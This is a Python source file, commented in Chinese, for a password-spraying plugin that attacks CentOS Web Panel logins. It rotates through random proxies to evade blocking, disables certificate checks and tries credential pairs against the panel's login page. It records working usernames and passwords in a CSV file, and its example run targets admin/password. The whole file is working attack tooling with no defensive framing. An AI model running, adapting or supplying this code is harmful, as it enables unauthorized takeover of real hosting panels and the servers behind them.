#!/usr/bin/env python
# cwp_plugin.py
# CentOS Web Panel 密碼噴灑插件，加入 proxy_pool 隨機代理支援

import logging
import requests
import csv
import os
from datetime import datetime
from threading import Lock
import random

requests.packages.urllib3.disable_warnings()

class CWPBruteForcePlugin:
    """CentOS Web Panel 密碼噴灑插件，支援 proxy_pool 隨機代理"""

    def __init__(self, threads=5, timeout=10, debug=False, proxy=None, proxy_pool=None, logger=None):
        self.threads = threads
        self.timeout = timeout
        self.debug = debug
        self.proxy = proxy
        self.proxy_pool = proxy_pool or []
        self.logger = logger or logging.getLogger(__name__)
        self.lock = Lock()
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})

    def update_proxy(self):
        """根據 proxy_pool 或單一 proxy 設定代理"""
        if self.proxy_pool:
            p = random.choice(self.proxy_pool)
            self.session.proxies.update({'http': p, 'https': p})
        elif self.proxy:
            self.session.proxies.update({'http': self.proxy, 'https': self.proxy})

    def determine_protocol(self, host):
        """嘗試確定 CWP 服務的協議 (HTTPS/HTTP)"""
        for protocol, port in [("https", 2031), ("http", 2030)]:
            try:
                url = f"{protocol}://{host}:{port}"
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code < 400:
                    return protocol, port
            except requests.RequestException:
                continue
        return "https", 2031

    def attempt_login(self, target, port, username, password):
        self.session.cookies.clear()
        self.update_proxy()

        if target.endswith("/login/"):
            target = target[:-len("/login/")]

        protocol, port = self.determine_protocol(target)
        login_url = f"{protocol}://{target}:{port}/login/"
        data = {'username': username, 'password': password, 'commit': 'Login'}

        try:
            response = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=False)
            if response.status_code == 302:
                location = response.headers.get("Location", "")
                redirect_url = f"{protocol}://{target}:{port}{location}" if location.startswith("/") else location
                get_response = self.session.get(redirect_url, timeout=self.timeout)
                if "Dashboard" in get_response.text:
                    return True, f"{response.status_code}"
                return False, f"{response.status_code}"
            elif response.status_code == 200 and "Dashboard" in response.text:
                return True, f"{response.status_code}"
            else:
                return False, f"{response.status_code}"
        except requests.RequestException as e:
            return False, str(e)

    def write_csv(self, file_path, fieldnames, data):
        with self.lock:
            with open(file_path, 'a', newline='', encoding='utf-8') as csvfile:
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                if csvfile.tell() == 0:
                    writer.writeheader()
                writer.writerow(data)

    def process_login(self, target, port, username, password, output_file, failed_log, timeout, retries):
        original_timeout = self.timeout
        self.timeout = timeout

        if not target.startswith("http"):
            target_url = f"http://{target}:{port}"
        else:
            target_url = target

        success = False
        status_info = ""
        for attempt in range(retries):
            logging.debug(f"Attempt {attempt+1}/{retries} for {target_url} with {username}:{password}")
            success, code = self.attempt_login(target, port, username, password)
            status_info = f"Attempt {attempt+1}: {code}"
            if success:
                break

        record_msg = f"{'✅ 成功' if success else '❌ 失敗'}: {target_url} - {username}/{password} | {status_info}"
        print(record_msg)
        logging.info(record_msg) if success else logging.warning(record_msg)

        if success:
            self.write_csv(output_file, ["Target", "Port", "Username", "Password", "Status", "ResponseCode"], {
                "Target": target,
                "Port": port,
                "Username": username,
                "Password": password,
                "Status": "Success",
                "ResponseCode": status_info
            })
        elif failed_log:
            self.write_csv(failed_log, ["Target", "Username", "Password", "ResponseCode", "FailureReason"], {
                "Target": target,
                "Username": username,
                "Password": password,
                "ResponseCode": status_info,
                "FailureReason": status_info
            })

        self.timeout = original_timeout


# 測試範例
if __name__ == '__main__':
    plugin = CWPBruteForcePlugin(
        threads=5,
        timeout=10,
        debug=True,
        proxy_pool=["http://127.0.0.1:8080", "http://127.0.0.2:8080"]  # 🧪 測試用代理池
    )
    plugin.process_login("example.com", 80, "admin", "password", "cwp_success.csv", "cwp_failed.csv", 5, 3)



